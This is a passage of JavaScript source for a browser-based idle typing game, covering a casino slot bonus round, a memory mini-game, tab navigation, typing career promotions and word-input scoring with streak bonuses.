        for (let i = 0; i < bonusGames; i++) {
            casinoStickyWildCount = 0;
            casinoBonusCount = 0;
            document.getElementById("casino-bonus-display").innerHTML = `Bonus game ${i + 1}/${bonusGames}`;
            await spinReels();
            let bonusWin = await checkWins();
            while (bonusWin.symbolsRemoved > 0) {
                bonusTotalWin += bonusWin.totalWin;
                bonusWin = await checkWins();
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            if(casinoBonusCount > 3) {
                playAchievementSound();
                bonusGames += casinoBonusCount * 5;
                document.getElementById("casino-win-feedback1").innerHTML = `You've unlocked ${casinoBonusCount * 5} bonus games!`;
                for (let reel = 0; reel < CASINO_REELS; reel++) {
                    for (let row = 0; row < CASINO_ROWS; row++) {
                        if (casinoBoard[reel][row] === CASINO_BONUS_SYMBOL) {
                            // pop win bonus symbols
                            const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                            element.classList.add('slot-pop-win');
                        }
                    }
                }
                await new Promise(resolve => setTimeout(resolve, 2000));
                for (let reel = 0; reel < CASINO_REELS; reel++) {
                    for (let row = 0; row < CASINO_ROWS; row++) {
                        if (casinoBoard[reel][row] === CASINO_BONUS_SYMBOL) {
                            const element = document.querySelector(`#casino-reel${reel + 1}-slot${row + 1}`);
                            element.classList.remove('slot-pop-win');
                        }
                    }
                }
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        }
        document.getElementById("casino-win-feedback1").innerHTML = `You've won $${formatShortScale(bonusTotalWin)} in bonus games!`;
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
    
    
    if (casinoCurrentPot > 0) {
        keystrokesBank += dollarsToKeystrokes(casinoCurrentPot);
    } else {
        document.getElementById("casino-win-feedback1").innerHTML = `Better luck next time!`;
    }
    
    gtag('event', 'casino', {
        'event_category': 'play',
        'slot_outcome': casinoCurrentPot.toFixed(2),
        'bonus_buy': bonusBuy,
        'wager': CASINO_WAGER_TIERS[casinoWagerTier],
    });
    
    casinoInBonus = false;
    casinoBusy = false;
}

let memoryUIState = "";
let memorySequenceActive = false;
let memoryStoryActive = false;
let memoryInput = false;
let memoryGameOver = false;
let memoryLevel = 0;
let memorySequence = "";
let memorySequenceInput = "";
let memoryStory;

function displayMemory() {
    if (AIAgent.level > 0) {
        document.getElementById('memory-tab').disabled = false;
    }
    if (memorySequenceActive) {
        handleMemorySequence();
    } else if (memoryStoryActive) {
        handleMemoryStory();
    } else {
        handleMemoryReadyOrGameOver();
    }
}

function handleMemorySequence() {
    if (memoryInput) {
        if (memoryUIState !== "input") {
            memoryUIState = "input";
            document.getElementById('memory-sequence-input').style.display = "flex";
            document.getElementById('memory-sequence-game-canvas').style.display = "none";
            document.getElementById('memory-input-box').focus();
        }
    } else {
        if (memoryUIState !== "active") {
            memoryUIState = "active";
            document.getElementById('memory-input-box').value = "";
            document.getElementById('memory-sequence-score').innerText = memoryLevel;
            document.getElementById('memory-tab').classList.remove("ready");
            document.getElementById('memory-start').style.display = "none";
            document.getElementById('memory-sequence-input').style.display = "none";
            document.getElementById('memory-sequence-game-canvas').style.display = "flex";
            document.getElementById('memory-sequence').innerText = memorySequence;
        }
    }
}

function handleMemoryStory() {
    if (memoryInput) {
        if (memoryUIState !== "input") {
            memoryUIState = "input";
            document.getElementById('memory-story-remember-btn').style.display = "none";
            document.getElementById('memory-story-submit-btn').style.display = "block";
            document.getElementById('memory-story-questions').style.display = "block";
            document.getElementById('memory-story-text').classList.add("blur");
            document.getElementById('memory-story-questions').innerHTML = "";
            memoryStory.questions.forEach((question, index) => {
                document.getElementById('memory-story-questions').innerHTML += `
                    <div class="memory-question">
                        <p>${question.question} <span class="memory-result"></span></p>
                        <div class="memory-options grid-2x2">
                            ${question.options.map((option, index) => `
                                <div class="memory-option" onclick="selectMemoryOption(this)">
                                    <div class="memory-option-answer">${String.fromCharCode(65 + index)}</div>
                                    <div class="memory-option-text">${option}</div>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                `;
            });
        }
    } else {
        if (memoryUIState !== "active") {
            memoryUIState = "active";
            document.getElementById('memory-tab').classList.remove("ready");
            document.getElementById('memory-story-title').innerText = memoryStory.title;
            document.getElementById('memory-story-text').innerText = memoryStory.content;
            document.getElementById('memory-story-text').classList.remove("blur");
            document.getElementById('memory-start').style.display = "none";
            document.getElementById('memory-story').style.display = "flex";
            document.getElementById('memory-story-remember-btn').style.display = "block";
            document.getElementById('memory-story-retry-btn').style.display = "none";
            document.getElementById('memory-story-submit-btn').style.display = "none";
            document.getElementById('memory-story-questions').style.display = "none";
        }
    }
}

function handleMemoryReadyOrGameOver() {
    if (!memoryGameOver) {
        if (memoryUIState !== "ready") {
            memoryUIState = "ready";
            document.getElementById('memory-input-box').value = "";
            document.getElementById('memory-tab').classList.add("ready");
            document.getElementById('memory-start').style.display = "flex";
            document.getElementById('memory-story').style.display = "none";
            document.getElementById('memory-game-over').style.display = "none";
        }
    } else {
        if (memoryUIState !== "gameover") {
            memoryUIState = "gameover";
            document.getElementById('memory-sequence-score2').innerText = memoryLevel;
            document.getElementById('memory-tab').classList.remove("ready");
            document.getElementById('memory-game-over').style.display = "flex";
            document.getElementById('memory-sequence-input').style.display = "none";
        }
    }
}

function resetMemoryGame() {
    memorySequenceActive = false;
    memoryStoryActive = false;
    memoryInput = false;
    memoryGameOver = false;
    memoryLevel = 0;
    memorySequence = "";
    memorySequenceInput = "";
}

function startMemorySequence() {
    if (memorySequenceActive || memoryStoryActive) return;

    memorySequenceActive = true;
    memoryInput = false;
    memoryLevel = 0;
    memorySequence = "";
    memorySequenceInput = "";
    generateSequence();
    generateSequence();
    generateSequence();
}

function startMemoryStory() {
    if (memorySequenceActive || memoryStoryActive) return;

    memoryStoryActive = true;
    memoryInput = false;
    memoryStory = stories[Math.floor(Math.random() * stories.length)];
}

function generateSequence() {
    memorySequence += Math.floor(Math.random() * 10);
}

function memoryBeginSequence() {
    if (!memorySequenceActive || memoryInput) return;
    memoryInput = true;
}

function memoryBeginStory() {
    if (!memoryStoryActive || memoryInput) return;
    memoryInput = true;
}

function memorySubmitSequence() {
    if (!memoryInput) return;

    memorySequenceInput = document.getElementById('memory-input-box').value;
    if (memorySequenceInput === memorySequence) {
        memoryLevel += 1;
        generateSequence();
        memoryInput = false;
    } else {
        memorySequenceActive = false;
        memoryInput = false;
        memoryGameOver = true;
    }
}
function selectMemoryOption(element) {
    // Remove the selected class from all options
    const options = element.parentElement.querySelectorAll('.memory-option');
    options.forEach(option => option.classList.remove('selected'));

    // Add the selected class to the clicked option
    element.classList.add('selected');
}

function memorySubmitStory() {
    if (!memoryInput) return;

    let correctAnswers = 0;
    const questions = document.querySelectorAll('.memory-question');
    questions.forEach((question, questionIndex) => {
        // Mark all the options correct/incorrect
        const options = question.querySelectorAll('.memory-option');
        options.forEach(option => {
            const optionText = option.querySelector('.memory-option-text').innerText;
            if (optionText === memoryStory.questions[questionIndex].answer) {
                option.classList.add('correct');
            } else {
                option.classList.add('incorrect');
            }
        });

        // Check the selected option
        const selectedOption = question.querySelector('.memory-option.selected');
        if (selectedOption) {
            const selectedAnswer = selectedOption.querySelector('.memory-option-text').innerText;
            if (selectedAnswer === memoryStory.questions[questionIndex].answer) {
                correctAnswers += 1;
                question.querySelector('.memory-result').innerText = "✅";
            } else {
                question.querySelector('.memory-result').innerText = "❌";
            }
        }
    });

    document.getElementById('memory-story-retry-btn').style.display = "block";
    document.getElementById('memory-story-submit-btn').style.display = "none";

    /*
    if (correctAnswers === memoryStory.questions.length) {
        memoryLevel += 1;
        memoryInput = false;
        // Proceed to the next story or sequence
    } else {
        memoryStoryActive = false;
        memoryInput = false;
        memoryGameOver = true;
    } */
}
// script.js

let currentWordIndex = 0;
let wordsToType = [];
let correctKeystrokesTimestamps = [];
let lastTypedWord = "";
let currentCharIndex = 0; // Track the current character position
let currentWordStreak = 0; // Track consecutive correct words
let perfectWordStreak = 0; // Track consecutive perfect words (no mistakes)
let currentWordMistakes = 0; // Track mistakes in the current word

let Tickrate = 30;
let Tickinterval = 1000 / Tickrate;


let currentPage = "main-tab";
const tabs = {
    main: {
        tab: document.getElementById("main-tab"),
        page: document.getElementById("gamePage")
    },
    reports: {
        tab: document.getElementById("reports-tab"),
        page: document.getElementById("reportsPage")
    },
    wordle: {
        tab: document.getElementById("wordle-tab"),
        page: document.getElementById("wordlePage")
    },
    arena: {
        tab: document.getElementById("arena-tab"),
        page: document.getElementById("arenaPage")
    },
    stock: {
        tab: document.getElementById("stock-tab"),
        page: document.getElementById("stockPage")
    },
    settings: {
        tab: document.getElementById("settings-tab"),
        page: document.getElementById("settingsPage")
    },
    research: {
        tab: document.getElementById("research-tab"),
        page: document.getElementById("researchPage")
    },
    guild: {
        tab: document.getElementById("guild-tab"),
        page: document.getElementById("guildPage")
    },
    hacker: {
        tab: document.getElementById("hacker-tab"),
        page: document.getElementById("hackerPage")
    },
    arcade: {
        tab: document.getElementById("arcade-tab"),
        page: document.getElementById("arcadePage")
    },
    casino: {
        tab: document.getElementById("casino-tab"),
        page: document.getElementById("casinoPage")
    },
    memory: {
        tab: document.getElementById("memory-tab"),
        page: document.getElementById("memoryPage")
    }
};

let currentLevelTier = 0;
let typingCareerLevels = [
    { tier: 0,  name: "Hobby Typing",                   jobTitle: "Newcomer",         threshold: 0 },
    { tier: 1,  name: "Neighborhood Typing Booth",      jobTitle: "Apprentice",       threshold: 100 },
    { tier: 2,  name: "Local Typing Agency",            jobTitle: "Assistant",        threshold: 1_000 },
    { tier: 3,  name: "Regional Typing Office",         jobTitle: "Associate",        threshold: 10_000 },
    { tier: 4,  name: "Nationwide Typing Firm",         jobTitle: "Supervisor",       threshold: 100_000 },
    { tier: 5,  name: "Continental Typing Corp",        jobTitle: "Manager",          threshold: 1_000_000 },
    { tier: 6,  name: "International Typing Group",     jobTitle: "Director",         threshold: 50_000_000 },
    { tier: 7,  name: "Global Typing Empire",           jobTitle: "Vice President",   threshold: 250_000_000 },
    { tier: 8,  name: "Interplanetary Typing Holdings", jobTitle: "Executive VP",     threshold: 1_000_000_000 },
    { tier: 9,  name: "Galactic Typing Conglomerate",   jobTitle: "CEO",              threshold: 10_000_000_000 },
    { tier: 10, name: "Cosmic Typing Dominion",         jobTitle: "Chairman",         threshold: 100_000_000_000 },
    { tier: 11, name: "Multiversal Typing Ascendancy",  jobTitle: "Supreme Typer",    threshold: 1_000_000_000_000 },
    { tier: 12, name: "Planar Typing Federation",       jobTitle: "Omni-Lexicographer", threshold: 10_000_000_000_000 },
    { tier: 13, name: "Ethereal Typing Conglomeration", jobTitle: "Arch Wordsmith",     threshold: 100_000_000_000_000 },
    { tier: 14, name: "Astral Typing Authority",        jobTitle: "Cosmos Pianist",     threshold: 500_000_000_000_000 },
    { tier: 15, name: "Void Typing Sanctum",            jobTitle: "Infinity Keymaster", threshold: 1_000_000_000_000_000 },
    { tier: 16, name: "Eldritch Typing Pantheon",       jobTitle: "Chronicle Wielder",  threshold: 5_000_000_000_000_000 },
    { tier: 17, name: "Mythical Typing Dominion",       jobTitle: "Fate Scribe",        threshold: 10_000_000_000_000_000 },
    { tier: 18, name: "Transcendent Typing Empire",     jobTitle: "All-lingual Overseer", threshold: 100_000_000_000_000_000 },
    { tier: 19, name: "Eternal Typing Oneness",         jobTitle: "Type Infinity",        threshold: 1_000_000_000_000_000_000 },
    { tier: 20, name: "Typing Deity",                   jobTitle: "Typing Deity",         threshold: 10_000_000_000_000_000_000 },
    { tier: 21, name: "Typing God",                     jobTitle: "Typing God",           threshold: 100_000_000_000_000_000_000 }
];

let canPromote = true;
function initPromotion() {
    currentLevelTier = typingCareerLevels.reduce((acc, biz, i) => {
        return (totalKeystrokes >= biz.threshold) ? i : acc;
    }, 0);
    const businessContainer = document.getElementById("business-title");
    const jobTitleContainer = document.getElementById("job-title");
    let newBizTitle = document.createElement('div');
    newBizTitle.innerText = typingCareerLevels[currentLevelTier].name;
    businessContainer.appendChild(newBizTitle);
    let newJobTitle = document.createElement('div');
    newJobTitle.innerText = typingCareerLevels[currentLevelTier].jobTitle;
    jobTitleContainer.appendChild(newJobTitle);
    if(currentLevelTier === typingCareerLevels.length - 1) {
        //document.getElementById("business-rankup-progress-bar").style.width = "100%";
        const XPBar = document.getElementById('xp-progress-bar');
        XPBar.style.setProperty('--progress', "100");
    }
}
let scrollingXPProgress = 0;
function checkPromotion() {
    if(!canPromote) return;
    if (currentLevelTier >= typingCareerLevels.length - 1) return;
    
    
    let lowerThreshold = typingCareerLevels[currentLevelTier].threshold;
    let nextThreshold = typingCareerLevels[currentLevelTier + 1].threshold;
    //document.getElementById("business-rankup-progress-bar").style.width = `${((totalKeystrokes - lowerThreshold) / (nextThreshold - lowerThreshold) * 100).toFixed(2)}%`;
    
    const XPBar = document.getElementById('xp-progress-bar');
    let XPProgress = ((totalKeystrokes - lowerThreshold) / (nextThreshold - lowerThreshold) * 100);
    if(XPProgress > 100) XPProgress = 100;
    scrollingXPProgress += (XPProgress - scrollingXPProgress) / Tickrate * 4;
    XPBar.style.setProperty('--progress', scrollingXPProgress);
    document.getElementById('xp-progress-text').textContent = `${scrollingXPProgress.toFixed(2)}%`;
    
    document.getElementById('xp-progress-level').textContent = `Lvl. ${currentLevelTier + 1}`;
    if(totalKeystrokes >= typingCareerLevels[currentLevelTier + 1].threshold) {
        canPromote=false; // Limit to 1 promotion a time
        const businessContainer = document.getElementById("business-title");
        const jobTitleContainer = document.getElementById("job-title");
        
        let oldBizTitle = businessContainer.querySelector('div');
        let oldJobTitle = jobTitleContainer.querySelector('div');
        if (oldBizTitle) oldBizTitle.style.animationName = 'scrollDown';
        if (oldJobTitle) oldJobTitle.style.animationName = 'scrollDown';
        
        setTimeout(() => {
            currentLevelTier++;
            if (oldBizTitle) businessContainer.removeChild(oldBizTitle);
            if (oldJobTitle) jobTitleContainer.removeChild(oldJobTitle);
            
            let newBizTitle = document.createElement('div');
            newBizTitle.innerText = typingCareerLevels[currentLevelTier].name;
            newBizTitle.style.animationName = 'scrollUp';
            businessContainer.appendChild(newBizTitle);
            
            let newJobTitle = document.createElement('div');
            newJobTitle.innerText = typingCareerLevels[currentLevelTier].jobTitle;
            newJobTitle.style.animationName = 'scrollUp';
            jobTitleContainer.appendChild(newJobTitle);
            createFloatingWord(`Promoted to ${typingCareerLevels[currentLevelTier].jobTitle}`);
            canPromote = true;
        }, 1000);
    }
}


function initGame() {
    loadLocalSave(); // Load saved game data
    // Initialize the words to type from words.js
    for (let i = 0; i < 60; i++) {
        wordsToType.push(getRandomWord());
    }
    updateWordsToType();
    
    setInterval(() => {
        generateKeystrokesAndResearchFromBuildings();
        generateFallingWords();
        checkModifiers();
    }, Tickinterval); // Call every tick
    
    setInterval(() => {
        if(autosave) {
            saveGame();
        }
    }, 5000); // Save every 5 seconds
    
    // Send heartbeat every 5 minutes (300000 milliseconds)
    setInterval(sendHeartbeat, 300000);
    
    displayAchievements();
    initUpgrades();
    initBuildings();
    initReports();
    initStockMarket();
    initPromotion();
    renderGameKeyboard();
    highlightNextKey();
    //==========================================
    document.getElementById('reset-button').addEventListener('click', () => {
        if(confirm("您确定要重置保存吗？")) {
            resetGame();
        }
    });
    //==========================================
    for (const key in tabs) {
        tabs[key].tab.addEventListener("click", () => switchTab(tabs[key].tab));
    }   
    //==========================================
    const volumeSlider = document.getElementById("volume-slider");
    const volumeLabel = document.getElementById("volume-label");
    
    const audioElements = document.querySelectorAll("audio");
    
    volumeSlider.addEventListener("input", function () {
        volume = volumeSlider.value / 100; // Convert to a 0-1 range
        volumeLabel.textContent = `${volumeSlider.value}%`;
        
        audioElements.forEach(audio => {
            audio.volume = volume;
        });
        playBuySound();
    });
    volumeSlider.value = volume * 100;
    volumeLabel.textContent = `${volumeSlider.value}%`;
    audioElements.forEach(audio => {
        audio.volume = volume;
    });
    //==========================================
    document.getElementById('toggle-skip-mistake').addEventListener('change', function () {
        skipOnMistake = this.checked;
    });
    document.getElementById('toggle-skip-mistake').checked = skipOnMistake;
    //==========================================
    document.getElementById('keyboard-layout').addEventListener('change', function () {
        keyboardLayout = this.value;
        renderWordleKeyboard(); // Update the Wordle keyboard layout
        renderGameKeyboard();
        highlightNextKey();
    });
    document.getElementById('keyboard-layout').value = keyboardLayout;
    //==========================================
    document.getElementById('theme-select').addEventListener('change', function () {
        currentTheme = this.value;
        applyTheme();
    });
    document.getElementById('theme-select').value = currentTheme;
    applyTheme();
    //==========================================
    document.getElementById('toggle-keyboard-highlight').addEventListener('change', function () {
        tenFingerAssitance = this.checked;
        if(tenFingerAssitance) {
            document.getElementById('game-keyboard-container').style.display = 'block';
        } else {
            document.getElementById('game-keyboard-container').style.display = 'none';
        }
    });
    if(tenFingerAssitance) {
        document.getElementById('toggle-keyboard-highlight').checked = true;
        document.getElementById('game-keyboard-container').style.display = 'block';
    } else {
        document.getElementById('toggle-keyboard-highlight').checked = false;
        document.getElementById('game-keyboard-container').style.display = 'none';
    }
    //==========================================
    document.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', () => {
            gtag('event', 'link_clicked', {
                'link_text': link.textContent,
                'link_url': link.href,
                'event_category': 'navigation'
            });
        });
    });
    //==========================================
    displayModules(); // Reveal all unlocked tabs.
    const pathSegments = window.location.pathname.split('/');
    const initialTabId = pathSegments[1] || currentPage;
    const initialTab = document.getElementById(initialTabId);
    if (initialTab) {
        if (initialTab.style.display !== 'none') {
            switchTab(initialTab, false);
        } else {
            //TODO: Show a message that the tab is locked
        }
    } else {
        // TODO: Show a message that the tab is not found
    }
    //==========================================
    window.typeParticleSystem = new TypeParticleSystem();
    //==========================================
    updateStickyOffsets();
    
    setTimeout(() => {
        updateStickyOffsets();
    }, 2000); // Update sticky offsets after 2s (Iframe fix)
    //==========================================
    sendHeartbeat(); // send the first heartbeat
}

function updateStickyOffsets() {
    const stickyTop = document.getElementById('sticky-top');
    const stickyTopOffset = document.getElementById('sticky-top-offset');
    const navbarContainer = document.getElementById('navbar-container');
    const stickyLeftOffset = document.getElementById('sticky-left-offset');
    
    if (stickyTop && stickyTopOffset) {
        stickyTopOffset.style.height = `${stickyTop.offsetHeight}px`;
    }
    
    if (navbarContainer && stickyLeftOffset) {
        stickyLeftOffset.style.width = `${navbarContainer.offsetWidth}px`;
    }
    
    if (navbarContainer && stickyTop) {
        navbarContainer.style.top = `${stickyTop.offsetHeight}px`;
    }
}

document.getElementById('input-box').addEventListener('input', function(e) {
    const inputBox = document.getElementById('input-box');
    const inputText = inputBox.value;
    
    // Handle backspace
    if (e.inputType === 'deleteContentBackward') {
        if (currentCharIndex > 0) {
            currentCharIndex--;
        }
    } else if (e.inputType === 'insertText') {
        currentCharIndex = inputText.length;
    }
    
    updateWordProgress(inputText.length, wordsToType[currentWordIndex].length);
    colorTextByCharacter(inputText, wordsToType[currentWordIndex], currentWordIndex);
    highlightNextKey();
    
    if (inputBox.value.endsWith(' ')) {
        const trimmedInput = inputText.trim();
        const currentWord = wordsToType[currentWordIndex];
        
        if (trimmedInput === currentWord) {
            // Handle correct word
            let isPerfectWord = currentWordMistakes === 0;
            
            manualKeystrokes += trimmedInput.length;
            let keyStrokeModCount = applyKPStoManual(trimmedInput.length);
            
            // Add streak bonus
            currentWordStreak++;
            if (currentWordStreak >= 3) {
                const streakBonus = Math.min(1 + (currentWordStreak * 0.05), 2); // Max 2x bonus
                keyStrokeModCount *= streakBonus;
                showStreakCounter(currentWordStreak);
            }
            
            // Add perfect word bonus
            if (isPerfectWord) {
                perfectWordStreak++;
                if (perfectWordStreak >= 2) {
                    const perfectBonus = Math.min(1 + (perfectWordStreak * 0.1), 3); // Max 3x bonus
                    keyStrokeModCount *= perfectBonus;
                    
                    if (perfectWordStreak >= 3) {
                        createPerfectWordEffect(trimmedInput);
                    }
                }
            } else {
                perfectWordStreak = 0;
            }
            
            keyStrokeModCount = applyModifiers(0, keyStrokeModCount);
            totalKeystrokes += keyStrokeModCount;
            keystrokesBank += keyStrokeModCount;
            cashEarnedManually += keyStrokeModCount;
            lastTypedWord = trimmedInput;
            
            markWordCompleted(currentWordIndex);
            currentWordIndex++;
            currentWordMistakes = 0;
            
            // Track each keystroke of the correct word
            for (let i = 0; i < trimmedInput.length; i++) {
                correctKeystrokesTimestamps.push(Date.now());
            }
            
            createFloatingWord(`<img src="images/icons/128/keystroke-coin-icon.png" class="currencyicon" alt="Keystroke Coin"> +${formatShortScale(keyStrokeModCount)}`);
            updateWordsToType();
            playTypeSound();
            inputBox.value = '';
            currentCharIndex = 0;
            
            gtag('event', 'word_input', {
                'wpm': wpm,
                'event_category': 'typing'
            });
        } else {
            // Handle incorrect word
            currentWordStreak = 0;
            perfectWordStreak = 0;
            hideStreakCounter();
            
            if (skipOnMistake) {
                currentWordIndex++;
                updateWordsToType();
                inputBox.value = '';
                currentCharIndex = 0;
                currentWordMistakes = 0;
                playTypoSound();
            }
        }
        highlightNextKey();
    }
});

// Add a tracking function for mistakes
document.getElementById('input-box').addEventListener('keydown', function(e) {
    if (e.key === 'Backspace') return;
    if (e.key.length > 1) return; // Ignore modifier keys
    
    const inputBox = document.getElementById('input-box');
    const inputText = inputBox.value;
    const currentWord = wordsToType[currentWordIndex];
    
    // Check if the current keystroke is incorrect
    if (inputText.length < currentWord.length && 
        e.key !== currentWord[inputText.length]) {
            currentWordMistakes++;
        }
    });
    
    function updateWordProgress(current, total) {
        const progressBar = document.querySelector('.word-progress-bar');
        if (progressBar) {
            const percentage = Math.min((current / total) * 100, 100);
            progressBar.style.width = `${percentage}%`;
            
            // Change color based on progress
            if (percentage < 33) {
                progressBar.style.backgroundColor = 'var(--mistake-color)';
            } else if (percentage < 66) {
                progressBar.style.backgroundColor = 'var(--wordle-present-bg)';
            } else {
                progressBar.style.backgroundColor = 'var(--correct-color)';
            }
        }
    }
    
    function markWordCompleted(index) {
        const wordsDisplay = document.getElementById('words-to-type');
        if (wordsDisplay.children[index]) {
            wordsDisplay.children[index].classList.add('completed');
        }
    }
    
    function showStreakCounter(streak) {
        const streakContainer = document.getElementById('streak-container');
        if (!streakContainer) {
            const typingPanel = document.getElementById('typing-panel');
            const newStreakContainer = document.createElement('div');
            newStreakContainer.id = 'streak-container';
            typingPanel.appendChild(newStreakContainer);
        }
        
        const container = document.getElementById('streak-container');
        container.textContent = `${streak}x Streak!`;
        container.classList.add('active');
        
        // Add appropriate class based on streak
        container.className = ''; // Reset classes
        container.classList.add('active');
        if (streak >= 10) {
            container.classList.add('epic-streak');
        } else if (streak >= 5) {
            container.classList.add('great-streak');
        } else {
            container.classList.add('good-streak');
        }
        
        // Create streak particles if available
        if (window.typeParticleSystem && streak >= 3) {
            window.typeParticleSystem.createStreakEffect(streak);
        }
    }
    
    function hideStreakCounter() {
        const streakContainer = document.getElementById('streak-container');
        if (streakContainer) {
            streakContainer.classList.remove('active');
        }
    }
    
    function createPerfectWordEffect(word) {
        const gameContainer = document.getElementById('game-container');
        const perfectWord = document.createElement('div');
        perfectWord.textContent = `Perfect: ${word}`;
        perfectWord.className = 'floating-word perfect-word';
        
        const rect = document.getElementById('input-box').getBoundingClientRect();
        perfectWord.style.left = `${rect.left + rect.width / 2}px`;
        perfectWord.style.top = `${rect.top}px`;
        
        const randomDuration = (Math.random() * 1 + 1.5).toFixed(2);
        perfectWord.style.animationDuration = randomDuration + 's';
        
        gameContainer.appendChild(perfectWord);
        
        setTimeout(() => {
            gameContainer.removeChild(perfectWord);
        }, randomDuration * 1000);
        
        // Use the particle system if available
        if (window.typeParticleSystem) {
            window.typeParticleSystem.createPerfectWordEffect(word);
        }
    }
    
    function colorTextByCharacter(inputText, word, currentIndex) {
        const wordsDisplay = document.getElementById('words-to-type');
        let coloredText = '';
        let mistakeFound = false;
        
        // Make current word stand out
        if (wordsDisplay.children[currentIndex]) {
            for (let i = 0; i < wordsDisplay.children.length; i++) {
                wordsDisplay.children[i].classList.remove('current');
            }
            wordsDisplay.children[currentIndex].classList.add('current');
        }
        
        // Process each character
        for (let i = 0; i < word.length; i++) {
            let characterClass = '';
            
            if (i < inputText.length) {
                // User has typed this character
                if (word[i] === inputText[i] && !mistakeFound) {
                    characterClass = 'character correct';
                } else {
                    characterClass = 'character mistake';
                    mistakeFound = true;
                }
            } else {
                // Character not yet typed
                characterClass = i === inputText.length ? 'character current' : 'character';
            }
            
            coloredText += `<span class="${characterClass}">${word[i]}</span>`;
        }
        
        if (wordsDisplay.children[currentIndex]) {
            wordsDisplay.children[currentIndex].innerHTML = coloredText;
        }
    }
    
    function updateWordsToType() {
        const wordsDisplay = document.getElementById('words-to-type');
        
        // Check if we need to add a progress bar
        if (!document.querySelector('.word-progress-container')) {
            const progressContainer = document.createElement('div');
            progressContainer.className = 'word-progress-container';
            const progressBar = document.createElement('div');
            progressBar.className = 'word-progress-bar';
            progressContainer.appendChild(progressBar);
            document.querySelector('.words-to-type-container').appendChild(progressContainer);
        }
        
        // Reset word progress
        document.querySelector('.word-progress-bar').style.width = '0%';
        
        if(currentWordIndex > 0) {
            let firstElement = wordsDisplay.children[0];
            const currentElement = wordsDisplay.children[currentWordIndex];
            let toRemove = [];
            
            while (currentElement && currentElement.getBoundingClientRect().top - 10 > firstElement.getBoundingClientRect().top) {
                toRemove.push(wordsDisplay.children[toRemove.length]);
                firstElement = wordsDisplay.children[toRemove.length];
            }
            
            if(toRemove.length > 0) {
                for(let i = 0; i < toRemove.length; i++) {
                    if (toRemove[i]) {
                        wordsDisplay.removeChild(toRemove[i]);
                        wordsToType.shift();
                        wordsToType.push(getRandomWord());
                    }
                }
                currentWordIndex = 0;
            }
        }
        
        // Add new words if needed
        if(wordsDisplay.children.length < wordsToType.length) {
            for(let i = wordsDisplay.children.length; i < wordsToType.length; i++) {
                const wordElement = document.createElement('div');
                wordElement.className = 'word';
                wordElement.textContent = wordsToType[i];
                wordsDisplay.appendChild(wordElement);
            }
        }
        
        // Update highlighting for the current word
        if (wordsToType[currentWordIndex]) {
            colorTextByCharacter('', wordsToType[currentWordIndex], currentWordIndex);
            document.getElementById('input-box').placeholder = `Type '${wordsToType[currentWordIndex]}' here...`;
        }
        
        highlightNextKey();
    }
    
    const AllWords = Object.keys(wordsList);
    function getRandomWord(length) {
        if (length) {
            let randomWord = AllWords[Math.floor(Math.random() * AllWords.length)];
            while(randomWord.length !== length) {
                randomWord = AllWords[Math.floor(Math.random() * AllWords.length)];
            }
            return randomWord;
        } else {
            return AllWords[Math.floor(Math.random() * AllWords.length)]; // Select a random key
        }
    }
    
    
    function updateStats() {
        scrollingKeystrokesBank += (keystrokesBank - scrollingKeystrokesBank) / Tickrate * 4;
        scrollingWpm += (wpm - scrollingWpm) / Tickrate * 10;
        
        scrollingWpmMultiplier += ((1 + wpm / 30) - scrollingWpmMultiplier) / Tickrate * 10;
        
        scrollingPassiveIncome += (getPassiveIncome() - scrollingPassiveIncome) / Tickrate * 4;
        document.getElementById('building-cash-earned').textContent = formatShortScale(cashEarnedBuildings);
        document.getElementById('manual-cash-earned').textContent = formatShortScale(cashEarnedManually);
        
        document.getElementById('total-keystrokes').textContent = formatShortScale(totalKeystrokes);
        document.getElementById('total-words').textContent = formatShortScale(totalKeystrokes / 5);
        
        document.getElementById('manual-keystrokes').textContent = formatShortScale(manualKeystrokes);
        document.getElementById('manual-words').textContent = formatShortScale(manualKeystrokes / 5);
        
        document.getElementById('keystrokes-bank').textContent = formatShortScale(scrollingKeystrokesBank);
        document.getElementById('keystrokes-bank2').textContent = formatShortScale(scrollingKeystrokesBank);
        
        document.getElementById('researchPoints').textContent = formatShortScale(totalResearchPoints);
        
        
        // Update WPM
        // Remove old keystrokes timestamps older than 5 seconds
        const now = Date.now();
        correctKeystrokesTimestamps = correctKeystrokesTimestamps.filter(timestamp => now - timestamp <= 5000);
        
        const correctKeystrokesPerSecond = correctKeystrokesTimestamps.length / 5; // Number of correct keystrokes in the last 5 seconds
        const wordsTyped = correctKeystrokesPerSecond / 5; // Calculate words based on 5 keystrokes per word
        wpm = wordsTyped * 60; // Calculate WPM
        document.getElementById('wpm').textContent = scrollingWpm.toFixed(2); // Update WPM display
        document.getElementById('wpm-multiplier').textContent = scrollingWpmMultiplier.toFixed(2);
        
        // Update passive income display
        document.getElementById('passive-income').textContent = formatShortScale(scrollingPassiveIncome);
        
        checkAchievements();
        displayModules();
        checkPromotion();
    }
    
    function createFloatingWord(word) {
        const gameContainer = document.getElementById('game-container');
        const floatingWord = document.createElement('div');
        floatingWord.innerHTML = word;
        floatingWord.className = 'floating-word';
        const rect = document.getElementById('input-box').getBoundingClientRect();
        // Set the left property randomly between 0% and 10%
        floatingWord.style.left = `${rect.left + Math.random() * 20}px`;
        floatingWord.style.top = `${rect.top}px`;
        // Set a random animation duration between 1s and 3s
        const randomDuration = (Math.random() * 2 + 1).toFixed(2);
        floatingWord.style.animationDuration = randomDuration + 's';
        
        gameContainer.appendChild(floatingWord);
        
        // Remove the floating word after the animation completes
        setTimeout(() => {
            gameContainer.removeChild(floatingWord);
        }, randomDuration * 1000); // Convert the duration to milliseconds
    }
    
    let wordsToGenerate = 0;
    
    function generateFallingWords() {
        // While there are words to generate, create falling words
        while (wordsToGenerate >= 1) {
            wordsToGenerate--;
        }
    }
    
    function showNotification(head, message, background) {
        const container = document.getElementById('notification-container');
        const notification = document.createElement('div');
        notification.className = 'notification';
        notification.style.backgroundImage = background;
        notification.innerHTML = `
    <div class="notification-body">
        <div class="notification-header">${head}</div>
        <div class="notification-section">${message}</div>
    </div>
    `;
        
        container.appendChild(notification);
        
        // Remove the notification after it fades out
        setTimeout(() => {
            container.removeChild(notification);
        }, 7000);
    }
    
    function formatShortScale(number) {
        if (!Number.isFinite(number)) return '∞'; // Handle infinite numbers
        if (number === 0) return '0';             // Handle zero
        
